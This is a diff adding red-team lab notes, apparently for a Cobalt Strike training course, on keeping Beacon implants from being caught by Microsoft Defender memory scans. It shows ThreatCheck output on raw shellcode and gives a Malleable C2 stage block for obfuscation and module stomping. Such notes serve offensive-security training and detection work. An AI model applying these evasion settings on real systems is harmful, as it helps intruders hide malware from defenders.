@@ -127,3 +127,42 @@ Should now be able to move laterally to the file server using PsExec.
     [+] established link to child beacon: 10.10.122.15
 
 Unload the CNA from the Script Manager to revert to the default payloads.
+
+## Malleable C2
+
+Beacon can also be caught when running in memory. Some actions (e.g. lateral movement) trigger memory scans; but Defender also does routine scans, so the time between spawning a Beacon and the time to detection varies. The "sms" label in the Defender UI shows the alert was from a memory scan (```Detected: Behavior:Win32/CobaltStrike.H!sms```).
+
+Get-MpThreatDetection labels them as behavior:_process:
+
+    Resources                      : {behavior:_process: C:\Windows\System32\rundll32.exe, pid:3196:59045527721095,
+                                     process:_pid:3196,ProcessStart:133415922931504282}
+
+Scanning the shellcode payload type with ThreatCheck can help find these signatures because although the service binary artifact itself is "clean":
+
+    PS C:\Users\Attacker\Desktop> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\http_x64.svc.exe
+    [+] No threat found!
+    [*] Run time: 0.55s
+
+The raw shellcode is not:
+
+    PS C:\Users\Attacker\Desktop> ThreatCheck.exe -f .\http_x64.xprocess.bin
+    [+] Target file size: 295936 bytes
+    [+] Analyzing...
+    [!] Identified end of bad bytes at offset 0xF61F
+
+The signature(s) target the reflective loader or the Beacon DLL. The Beacon source code is closed source. We could technically write a completely custom reflective loader through the UDRL kit (out of scope for CRTO). The easiest way to make modifications to both of these components is by using what's exposed in Malleable C2. Four settings to try:
+
+    stage {
+            set userwx "false";    // allocate memory for the Beacon DLL as RW/RX, not RWX
+            set cleanup "true";    // free memory associated with the reflective loader after loading
+            set obfuscate "true";  // load Beacon into memory without DLL headers; reduces the number of indicators in memory (among other things)
+            set module_x64 "xpsservices.dll"; // blends in better by masquerading as an existing DLL
+            set module_x86 ...                // Must be equal or larger size than Beacon, and must not be needed
+    }
+
+## Resource Kit
+
+The Antimalware Scan Interface (AMSI) is a component of Windows which allows applications to integrate themselves with an antivirus engine by providing a consumable, language agnostic interface.  It was designed to tackle "fileless" malware that was so heavily popularised by tools like the EmpireProject, which leveraged PowerShell for complete in-memory C2.
+
+
+
